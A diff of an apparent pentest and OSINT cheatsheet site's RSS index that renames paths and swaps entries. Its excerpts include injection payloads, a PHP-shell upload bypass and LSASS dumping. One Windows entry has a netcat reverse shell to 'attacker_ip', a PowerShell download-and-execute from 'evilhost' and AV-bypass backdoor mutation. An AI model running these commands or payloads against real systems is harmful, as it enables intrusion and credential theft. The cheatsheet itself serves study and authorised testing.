-RPC # You can use rpc to enumerate domain objects rpcclient -U &amp;lt;user&amp;gt; &amp;lt;IP-DC&amp;gt; rpcclient $&amp;gt; enumdomusers rpcclient $&amp;gt; enumdomgroups rpcclient $&amp;gt; querygroupmem 0x200 rpcclient $&amp;gt; srvinfo rpcclient $&amp;gt; querygroup 0x42 rpcclient $&amp;gt; queryuser 0x42 rpcclient $&amp;gt; getdompwinfo rpcclient $&amp;gt; getusrdompwinfo 0x42 
-Enumeration # You can use enum4linux to enumerate domain users # You can try anonymous binding sudo enum4linux domaine.</description>
+Domain Properties rpcclient # You can use rpc to enumerate domain objects rpcclient -U &amp;lt;user&amp;gt; &amp;lt;IP-DC&amp;gt; rpcclient $&amp;gt; enumdomusers rpcclient $&amp;gt; enumdomgroups rpcclient $&amp;gt; querygroupmem 0x200 rpcclient $&amp;gt; srvinfo rpcclient $&amp;gt; querygroup 0x42 rpcclient $&amp;gt; queryuser 0x42 rpcclient $&amp;gt; getdompwinfo rpcclient $&amp;gt; getusrdompwinfo 0x42 
+enum4linux # You can use enum4linux to enumerate domain users # You can try anonymous binding sudo enum4linux domaine.</description>
     </item>
     
     <item>
       <title>Drupal</title>
-      <link>/web-attacks/content-management-system-cms/drupal/</link>
+      <link>/web-pentest/content-management-system-cms/drupal/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/content-management-system-cms/drupal/</guid>
+      <guid>/web-pentest/content-management-system-cms/drupal/</guid>
       <description>https://github.com/gfoss/attacking-drupal
 Droopescan # Not Drupal specific but can work too (Wordpress, SilverStripe, Joomla, Moodle, Drupal) droopescan --help droopescan scan --help# Target Identification droopescan scan drupal -u example.org droopescan scan drupal -U list_of_urls.txt # You can also ommit the drupal argument, so it will trigger the cms identification droopescan scan -u example.org droopescan scan -U list_of_urls.txt# Scan types # By default, most of the time, 4 threads droopescan scan drupal -u example.</description>
     </item>
@@ -412,13 +456,26 @@ Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quot
     
     <item>
       <title>File Upload</title>
-      <link>/web-attacks/files-inclusions-and-injections/file_upload/</link>
+      <link>/web-pentest/files-and-files-inclusions/file_upload/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/files-inclusions-and-injections/file_upload/</guid>
+      <guid>/web-pentest/files-and-files-inclusions/file_upload/</guid>
       <description>File Upload are well known and kinda old PHP vulnerabilities but can still work some times  
 Double Extension # If the target is only checking extension → exploit.php.jpg 
 MIME Type # Classical, using Burp for example Content-Type: application/x-php → Content-Type: image/gif # Using cURL curl -i -F &amp;#34;file=@shell.php;type=image/gif&amp;#34; --cookie &amp;#34;...&amp;#34; &amp;#34;&amp;lt;target&amp;gt;&amp;#34; # You can also create or update the following registry key on Windows {{HKLM\SOFTWARE\Classes\.php}} # Then create a “String” type registry key and, named “Content-Type&amp;#34; and set the value “image/gif”</description>
+    </item>
+    
+    <item>
+      <title>Firefox addons</title>
+      <link>/open-source-intelligence-osint/tools-and-methodology/firefox_addons/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/tools-and-methodology/firefox_addons/</guid>
+      <description>OSINT Bookmarks https://www.osintcombine.com/osint-bookmarks 
+Flag Fox Flagfox is an extension that displays a flag icon indicating the current webserver&amp;rsquo;s physical location.
+It then launch a geotool webpage to get more informations about the website you are visiting About IP &amp;amp; Domain.
+Google Cache Google Cache lets you visit retrieve the web page from Google Web Cache when the site is offline.
+If the site is offline, you can just press toolbar button and request cached version of the page from Google Cache.</description>
     </item>
     
     <item>
@@ -433,10 +490,10 @@ Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39
     
     <item>
       <title>Gasmak</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/gasmask/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/gasmask/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/gasmask/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/gasmask/</guid>
       <description>General Informations https://github.com/twelvesec/gasmask # All in one information gathering tool # Automated tool used to gather information on the following sources : # - ask, bing, crt, censys.io, dns, dnsdumpster, dogpile, github # - google, googleplus, instagram, linkedin, netcraft, pgp # - reddit, reverse dns, twitter, vhosts, virustotal, whois, # - yahoo, yandex, youtube # 2 modes : Basic &amp;amp; Nongoogle # - whois/dns/reverse DNS/bing virtual hosts # - search in other engines # API Keys needed : shodan, censys,</description>
     </item>
     
@@ -456,46 +513,73 @@ MISC &amp;amp; Tricks # Show hidden options ./john --list=hidden-options # Using
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/network/ldap_dns/</guid>
-      <description>LDAP Null Bind Enumeration # Syntax ldapsearch -h &amp;#34;LENOMDELAMACHINELDAP&amp;#34; -p &amp;#34;LEPORTSURLEQUELONYACCEDE&amp;#34; -x -b &amp;#34;ou=UNE_OU_EXISTANTE,DC=QUIVABIEN,DC=SUITE,DC=FOO&amp;#34; -v # Classic research ldapsearch -h challenge01.root-me.org -p 54013 -x -b &amp;#34;ou=anonymous,dc=challenge01,dc=root-me,dc=org&amp;#34; &amp;#34;cn=*&amp;#34; 
-DNS Zone Transfer # Zone transfer using dig dig @challenge01.root-me.org -p 54011 AXFR ch11.challenge01.root-me.org. # Zone transfer using nslookup nslookup -type=any &amp;gt; set port &amp;lt;port&amp;gt; &amp;gt; server challenge01.root-me.org &amp;gt; ch11.challenge01.root-me.org# Custom PERL zone transfer #!/usr/bin/env perl use warnings; use strict; use Net::DNS; # ici je teste rapidement si j&amp;#39;ai bien installe le module Net::DNS print Net::DNS-&amp;gt;version, &amp;#34;\n&amp;#34;; # creation de l&amp;#39;instance du resolveur maison.</description>
+      <description>LDAP Null Bind Enumeration # Syntax ldapsearch -h &amp;#34;LENOMDELAMACHINELDAP&amp;#34; -p &amp;#34;LEPORTSURLEQUELONYACCEDE&amp;#34; -x -b &amp;#34;ou=UNE_OU_EXISTANTE,DC=QUIVABIEN,DC=SUITE,DC=FOO&amp;#34; -v 
+DNS Zone Transfer # Zone transfer using dig dig @&amp;lt;ns&amp;gt; -p 54011 AXFR &amp;lt;host&amp;gt; # Zone transfer using nslookup nslookup -type=any &amp;gt; set port &amp;lt;port&amp;gt; &amp;gt; server &amp;lt;ns&amp;gt; &amp;gt; &amp;lt;host&amp;gt;# Custom PERL zone transfer #!/usr/bin/env perl use warnings; use strict; use Net::DNS; # ici je teste rapidement si j&amp;#39;ai bien installe le module Net::DNS print Net::DNS-&amp;gt;version, &amp;#34;\n&amp;#34;; # creation de l&amp;#39;instance du resolveur maison.</description>
     </item>
     
     <item>
-      <title>Methodology</title>
-      <link>/open-source-intelligence-osint/general/methodology/</link>
+      <title>LinkedIn</title>
+      <link>/open-source-intelligence-osint/platforms-hunting/linkedin/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/general/methodology/</guid>
-      <description>Sources : https://www.dfir.training/osint
-Gap Analysis &amp;amp; others # In OSINT - Analytical mind # Ask a lot of questions : Who, What, When, Where, Why, and How # Be Curious and Craft a Storyline # Use Gap Analysis shttps://nixintel.info/osint/using-gap-analysis-to-keep-osint-investigations-on-track/ 1. What do we know ? 2. What does the information mean? 3. What do I still need to know? 4. How do I find out? # Reflect on failures but also wins 1.</description>
+      <guid>/open-source-intelligence-osint/platforms-hunting/linkedin/</guid>
+      <description># Check the &amp;#34;see coordinates&amp;#34; on accounts # Sometimes, people link other resources 
+ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. # Provide a search string # Ouput as XLSX but intented to work with Google Sheets # After importing you&amp;#39;ll have a dataset and report worksheet # Dataset : First name, last name, occupation, industry, profile URL, picture URL # Report : Picture (displayed), Full name, occupation, Link to profile # Full size profile photo # Then right click &amp;#34;view image&amp;#34; https://linkedin.</description>
     </item>
     
     <item>
       <title>Nmap Cheatsheet</title>
-      <link>/recon-enumeration/port-scanning/nmap_cheatsheet/</link>
+      <link>/network/port-scanning/nmap_cheatsheet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/port-scanning/nmap_cheatsheet/</guid>
+      <guid>/network/port-scanning/nmap_cheatsheet/</guid>
       <description>https://github.com/Tib3rius/AutoRecon Full commands examples # Ping scan nmap -sP 192.168.0.0/24 # Quick scan nmap -T4 -F 192.168.1.1 -vvv # Quick scan plus (more info but more aggressive) nmap -sV -T4 -O -F –version-light 192.168.1.1 -vvv # TCP Syn and UDP Scan (requires root) nmap -sS -sU -PN -p T:80,T:445,U:161 192.168.1.1 # Soft nmap nmap -v -Pn -n -T4 -sT -sV --version-intensity=5 --reason 192.168.1.1 # Full nmap nmap -v -Pn -n -T4 -sT -p- --reason 192.</description>
     </item>
     
     <item>
       <title>NoSQL Injections</title>
-      <link>/web-attacks/server-side-injections/nosql/</link>
+      <link>/web-pentest/injections/server-side-injections/nosql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/server-side-injections/nosql/</guid>
+      <guid>/web-pentest/injections/server-side-injections/nosql/</guid>
       <description>Basic Authentication index.php?login[$regex]=a.*&amp;amp;pass[$ne]=lol index.php?login[$gt]=admin&amp;amp;login[$lt]=test&amp;amp;pass[$ne]=1 # Basic NoSQL Injection http://url?login[$nin][]=admin&amp;amp;login[$nin][]=test&amp;amp;pass[$ne]=toto 
 Blind NoSQL Injection # Get size index.php ?chall_name=nosqlblind&amp;amp;flag[$regex]=.1 # Enumeration index.php ?</description>
     </item>
     
     <item>
-      <title>PHP Functions</title>
-      <link>/web-attacks/php-vulnerabilities/functions/</link>
+      <title>OPSEC</title>
+      <link>/open-source-intelligence-osint/technical-recon/misc/opsec/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/php-vulnerabilities/functions/</guid>
-      <description>Assert() # The assert() function will execute code in params # Example using root-me challenge ?page=.. Warning : assert() : Assertion &amp;#34;strpos(’includes/...php’, ’..’) === false&amp;#34; failed in path/index.php on line 8 # The request looks like this assert(&amp;#34;strpos(&amp;#39;includes/&amp;#39; . $_GET[&amp;#39;page&amp;#39;] . &amp;#39;.php&amp;#39;, &amp;#39;..&amp;#39;) === false&amp;#34;) # If we inject this ?page=salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons # The request will look like assert(&amp;#34;strpos(&amp;#39;/includes/salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons.php&amp;#39;,&amp;#39;..&amp;#39;) ===false&amp;#34;) # Then, to exploit ?</description>
+      <guid>/open-source-intelligence-osint/technical-recon/misc/opsec/</guid>
+      <description>[WIP]</description>
+    </item>
+    
+    <item>
+      <title>OSINT</title>
+      <link>/resources/osint/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/resources/osint/</guid>
+      <description>Social Networks  The new Facebook Graph Search Part 1 (https://osintcurio.us/2019/08/22/the-new-facebook-graph-search-part-1/) The new Facebook Graph Search Part 2 (https://osintcurio.us/2019/08/22/the-new-facebook-graph-search-part-2/) Find Instagram User ID (https://codeofaninja.com/tools/find-instagram-user-id) Using Snapchat for OSINT (https://osintcurio.us/2020/04/13/using-snapchat-for-osint-10-minute-tip/) TikTok investigations and OSINT Tips (https://www.skopenow.com/news/tiktok-investigations-and-osint-tips)s How can we use Messenger Apps in OSINT (https://medium.com/@Ginger_T/how-can-we-use-messenger-apps-in-osint-682cbc634f) A better way to find and archive OSINT on Twitter (https://jakecreps.com/2020/04/10/threadreaderapp-osint-archive-twitter/amp/) OSINT : How to find information on anyone (https://medium.com/the-first-digit/osint-how-to-find-information-on-anyone-5029a3c7fd56) Getting a Grasp on Google ID&amp;rsquo;s (https://medium.</description>
+    </item>
+    
+    <item>
+      <title>PHP Functions</title>
+      <link>/web-pentest/php-vulnerabilities/functions/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/php-vulnerabilities/functions/</guid>
+      <description>Assert() # The assert() function will execute code in params # Example using challenge ?page=.. Warning : assert() : Assertion &amp;#34;strpos(’includes/...php’, ’..’) === false&amp;#34; failed in path/index.php on line 8 # The request looks like this assert(&amp;#34;strpos(&amp;#39;includes/&amp;#39; . $_GET[&amp;#39;page&amp;#39;] . &amp;#39;.php&amp;#39;, &amp;#39;..&amp;#39;) === false&amp;#34;) # If we inject this ?page=salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons # The request will look like assert(&amp;#34;strpos(&amp;#39;/includes/salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons.php&amp;#39;,&amp;#39;..&amp;#39;) ===false&amp;#34;) # Then, to exploit ?</description>
+    </item>
+    
+    <item>
+      <title>Parameters</title>
+      <link>/web-pentest/resources-discovery/parameters/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/resources-discovery/parameters/</guid>
+      <description>Hidden parameters # Sometimes hidden parameters are set on pages # You can use tools like Arjun to find them (https://github.com/s0md3v/Arjun) python3 arjun.py -u https://api.example.com/endpoint --get # Multi threading python3 arjun.py -u https://api.example.com/endpoint --get -t 22 # Delay between requests python3 arjun.py -u https://api.example.com/endpoint --get -d # You can also use patator # GET patator http_fuzz url=&amp;#39;url/FILE0=1&amp;#39; 0=parameters.txt -x ignore:fgrep=&amp;#39;error reflected content&amp;#39; # POST patator http_fuzz url=&amp;#39;url/&amp;#39; method=POST body=&amp;#39;FILE0=1&amp;#39; 0=wordlist.</description>
     </item>
     
     <item>
@@ -546,41 +630,51 @@ Golden Ticket # Golden Ticket &amp;gt; Nom du compte administrateur (Administrat
     </item>
     
     <item>
-      <title>Subdomain Enumeration</title>
-      <link>/open-source-intelligence-osint/technical-recon/subdomain_enumeration/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/subdomain_enumeration/</guid>
-      <description>Google Dorks &amp;amp; Bing Dorks # Google dorks are usefull for finding new subdomains site:wikipedia.org site:*.wikipedia.org -www -store -jobs -uk # Bing also support dorks and can give others results site: # When you use the Google Dork: site:*.example.com, NEVER forget to check site:*.*.example.com site:*.*.*.example.com # Github dorks also allow to find many subdomains &amp;#34;teslamotors.com&amp;#34; password # ... 
-Online DNS tools and services # VirusTotal runs its own passive DNS replication service # DNS Dumpster can also find large number of sub-domains</description>
-    </item>
-    
-    <item>
       <title>Tricks</title>
       <link>/windows-systems/privilege-escalation/tricks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/tricks/</guid>
-      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://evilhost/Malicious.ps1&amp;#39;)&amp;#34; # Payload as a trusted binary # Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\ # Then %userprofile%\AppData\Local\Microsoft\Teams\Update.</description>
     </item>
     
     <item>
-      <title>Twitter</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/twitter/</link>
+      <title>Twitter Dorks</title>
+      <link>/open-source-intelligence-osint/dorks/twitter_dorks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/twitter/</guid>
-      <description>Tips &amp;amp; Tricks # With spoonbill, you can check and record people accounts modification # It checks accounts of people you&amp;#39;re following https://tweepsect.com/ # When was created an account http://twbirthday.com/***REMOVED***/ # Find stalker (checks who&amp;#39;s following and who&amp;#39;s followed) and intersect them https://tweepsect.com/ # You can triangulate accounts by looking who&amp;#39;s following x+x or who y+y follows http://twiangulate.com https://doesfollow.com/ # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweet geolocation https://onemilliontweetmap.com # Tweeter account analysis (account needed) https://tweetreach.</description>
+      <guid>/open-source-intelligence-osint/dorks/twitter_dorks/</guid>
+      <description>Twitter Dorks https://twitter.com/BNFC_13/status/1160890864337600512 # Tweets containing word1 AND word2 (default operator) &amp;lt;word1&amp;gt; &amp;lt;word2&amp;gt; # Containing exact expression &amp;#34;word1&amp;#34; # Tweets containing word1 OR word 2 &amp;lt;word1&amp;gt; OR &amp;lt;word2&amp;gt; # Containing &amp;#34;cyber&amp;#34; but without &amp;#34;security&amp;#34; cyber -security # All tweets from an account or responding to an account from:&amp;lt;account&amp;gt; to:&amp;lt;account&amp;gt; # Filter results and display only results from followed accounts filter:follows exclude:medias # Tweets after the date or before the date &amp;lt;word&amp;gt; since:2015-02-20 &amp;lt;word&amp;gt; until:2015-02-20 # Minimal RT / likes / replies min_retweets:x min_faves:x min_replies:x # Language lang:fr # Tweets positive and negative &amp;lt;word&amp;gt; :) &amp;lt;word&amp;gt; :( # Tweets with a question &amp;lt;word&amp;gt; ?</description>
+    </item>
+    
+    <item>
+      <title>Wayback Web Archive</title>
+      <link>/open-source-intelligence-osint/company_investigations/wayback_machine/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/company_investigations/wayback_machine/</guid>
+      <description>Wayback Machine (https://archive.org/web/) # You can also uses as CLI tool https://github.com/tomnomnom/waybackurls cat domains.txt | waybackurls &amp;gt; urls # Cache pages http://cachedview.com/ https://www.giftofspeed.com/cache-checker/ 
+Getting PDF on Web Archive # Great resource https://openfacto.fr/2020/04/19/recuperer-des-fichiers-pdf-en-masse-sur-archive-org/ # Step 1 # By adding &amp;#39;*&amp;#39; at the and of a company URL, you can get all indexed documents # Then you can filter by &amp;#34;PDF&amp;#34; (right search bar) https://web.archive.org/web/*/https://testcompany.fr/* # Step 2 # Here you want to get URL list # In the Firefox developer tools -&amp;gt; Network # You can get an HTTP request to a JSON file containing URLs # Copy as curl and get the file # Step 3 # OpenRefine can help to parse and process the file # Filter on PDF # Step 4 # NEVER download directly # You can do it through archived document # Add the prefix for every line https://web.</description>
     </item>
     
     <item>
       <title>25 - SMTP</title>
-      <link>/recon-enumeration/services-enumeration/25_smtp/</link>
+      <link>/network/services-enumeration/25_smtp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/25_smtp/</guid>
+      <guid>/network/services-enumeration/25_smtp/</guid>
       <description> Identification # Connection and test using telnet telnet &amp;lt;IP&amp;gt; 25 EHLO &amp;lt;IP&amp;gt; VRFY root EXPN root Mail from: me@test.com To: root@test.com Data: Subject: Message Hi, Just a test message. (Double carriage return) 
 Enumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t &amp;lt;IP&amp;gt;</description>
+    </item>
+    
+    <item>
+      <title>Buscador</title>
+      <link>/open-source-intelligence-osint/tools-and-methodology/buscador/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/tools-and-methodology/buscador/</guid>
+      <description>Tools Custom Firefox Browser &amp;amp; Add-Ons Custom Chrome Browser &amp;amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego	Metagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities 
+Tools descriptions # Firefox and some plugins - Download Star - ExifViewer - Firefox multiaccount - HTTPS Everywhere - Image Search Options - MJsonViewer - Nimbus Screen Capture - Resurrect Pages - Take Webpage Screenshots Entirely - uBlock Origin - User-Agent Switcher - Video DownloadHelper # Google Chrome with other plugins # TOR Browser # Custom Video Manipulation Utilities # Custom Video Download Utility # Amass → DNS Enumeration → Network Mapping # BleachBit → Clean your PC # EmailHarvester → Collect emails using search engines # Exiftool → Extract metadata from images # EyeWitness → Take screenshots from website → Get HTTP headers → Identify some credentials → Basic tool semi passive # Ghiro → Ghiro is a fully automated tool designed to run forensics analysis over a massive amount of images → Just using an user friendly and fancy web application.</description>
     </item>
     
     <item>
@@ -604,6 +698,16 @@ Cracking shadow files unshadow passwd shadow &amp;gt; shadowjohn.txt john --word
     </item>
     
     <item>
+      <title>Credentials Leaks</title>
+      <link>/open-source-intelligence-osint/human-recon/leaks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/leaks/</guid>
+      <description>PwnedOrNot https://github.com/thewhiteh4t/pwnedOrNot.git # Simple python tool used to check haveIbeenpwned leaks for an e-mail or a list # The tool will then check if the dump is accessible (using haveibeenpwned/pastebin) to get passwords python pwnedornot.py -h python pwnedornot.py -e email@test.com python pwnedornot.py -f file.txt 
+Pwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search leaks and retrieve known passwords python pwndb.py --target email@test.fr python pwndb.py --list file python pwndb.py --target email@test.</description>
+    </item>
+    
+    <item>
       <title>DC Shadow</title>
       <link>/windows-systems/post-exploitation-techniques/dc_shadow/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -613,11 +717,21 @@ Cracking shadow files unshadow passwd shadow &amp;gt; shadowjohn.txt john --word
     </item>
     
     <item>
-      <title>Directory &amp; File Discovery</title>
-      <link>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</link>
+      <title>Darkweb Investigation</title>
+      <link>/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</guid>
+      <guid>/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/</guid>
+      <description>[WIP]
+Search the Darkweb https://medium.com/@darksearch/darksearch-the-1st-real-search-engine-dark-web-darksearch-vs-ahmia-84852fd4c51b https://darksearch.io/</description>
+    </item>
+    
+    <item>
+      <title>Directory &amp; File Discovery</title>
+      <link>/web-pentest/files-and-files-inclusions/directory_file_discovery/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/files-and-files-inclusions/directory_file_discovery/</guid>
       <description>Test for directory traversal  
 General &amp;amp; Tricks # Check for .git # If there is a git, possible to download the source code # Check for temp saved files # Vim creates .swp files index.php/.admin.html.swp # Path traversal cheat sheet https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/ https://pentestwiki.org/wiki/Path_traversal#Windows 
 Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=&amp;#39;Authorization: Basic YOUR_BASE64_HERE&amp;#39; # Admin wordlist patator http_fuzz url=&amp;#39;url/FILE0&amp;#39; 0=wordlist/admin.</description>
@@ -633,43 +747,32 @@ Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt
     </item>
     
     <item>
-      <title>Facebook</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/facebook/</link>
+      <title>Github Dorks</title>
+      <link>/open-source-intelligence-osint/dorks/github_dorks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/facebook/</guid>
-      <description>Tips &amp;amp; Tricks # Stalking and Information Gathering https://stalkscan.com/ # Facebook video downloader https://fbdown.net/ # Find Facebook ID https://findmyfbid.com https://lookup-id.com/ # Facebook tool for multi searches https://whopostedwhat.com/ 
-Facebook Tricks # You can search by e-mail # You can find accounts by e-mail with the recover function https://www.facebook.com/login/identify?ctx=recover https://www.facebook.com/login/identify # Search photo by ID https://www.facebook.com/photo.php?fbid=PHOTO-ID-HERE # You can search for car using plate number # For example ST-597-NS will give you car photos identified with relating plate number</description>
+      <guid>/open-source-intelligence-osint/dorks/github_dorks/</guid>
+      <description>Github Dorks https://gist.github.com/jhaddix/77253cea49bf4bd4bfd5d384a37ce7a4 # Github dorks work a lot with filename and extension # You can build search like this filename:bashrc extension:pem langage:bash # Possible to search terms and use these keywords # Some usefull examples extension:pem private # Private SSH Keys extension:sql mysql dump # MySQL dumps extension:sql mysql dump password # MySQL dumps with passwords filename:wp-config.php # Wordpress config file filename:.htpasswd # .htpasswd filename:.git-credentials # Git stored credentials filename:.</description>
     </item>
     
     <item>
       <title>Joomla!</title>
-      <link>/web-attacks/content-management-system-cms/joomla/</link>
+      <link>/web-pentest/content-management-system-cms/joomla/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/content-management-system-cms/joomla/</guid>
+      <guid>/web-pentest/content-management-system-cms/joomla/</guid>
       <description>Scanning and Enumeration # Get components running on the website joomscan --url http://10.10.10.150/ --random-agent --enumerate-components # You can also check /administrator/manifests/files/joomla.xml # If you find components, you can often access the configuration file # JCE component → /components/com_jce/jce.xml # Check for vulnerabilities affecting components # Joomlavs is also a good scanning tool https://github.com/rastating/joomlavs 
 Reverse Shell # You must first log as admin # Then you must activate the PHP extension in settings System → Component → Media → “php” in legal extensions and nothing in ignored extension # If it&amp;#39;s not enough and the manager is detecting malicious PHP upload, you can still edit templates # For example, the /index.</description>
     </item>
     
     <item>
       <title>LDAP Injections</title>
-      <link>/web-attacks/server-side-injections/ldap/</link>
+      <link>/web-pentest/injections/server-side-injections/ldap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/server-side-injections/ldap/</guid>
+      <guid>/web-pentest/injections/server-side-injections/ldap/</guid>
       <description> Basic LDAP Injection # Classical request : (&amp;amp;(uid=)(userPassword=)) # So result is TRUE if uid AND userPassword are true # You can put ‘)’ in request to crash and see the request username : *)(|(uid=* password : ) → (&amp;amp;(uid=*)(|(uid=*)(userPassword=))) OR username=* password=*)(&amp;amp; → (&amp;amp;(uid=*)(userPassword=*)(&amp;amp;)) 
 Blind LDAP Injection # You have to find/imagine how is the request built # test using only a char → OK → request is (mail=*[texte]*) # You can try (mail=*)(sn=*) → )(sn= → OK # Then, the password attribute (mail=*)(password=*) → OK @*)(password=x → FALSE @*)(password=d → TRUE # You can the enumerate each char</description>
-    </item>
-    
-    <item>
-      <title>LSASS and Mimikatz</title>
-      <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
-      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
-Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
     </item>
     
     <item>
@@ -703,40 +806,30 @@ GPG Encryption sudo gpg --decrypt /mnt/media/dir2/findme.</description>
     
     <item>
       <title>MISC &amp; Others</title>
-      <link>/web-attacks/client-side-injections/misc_others/</link>
+      <link>/web-pentest/injections/client-side-injections/misc_others/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
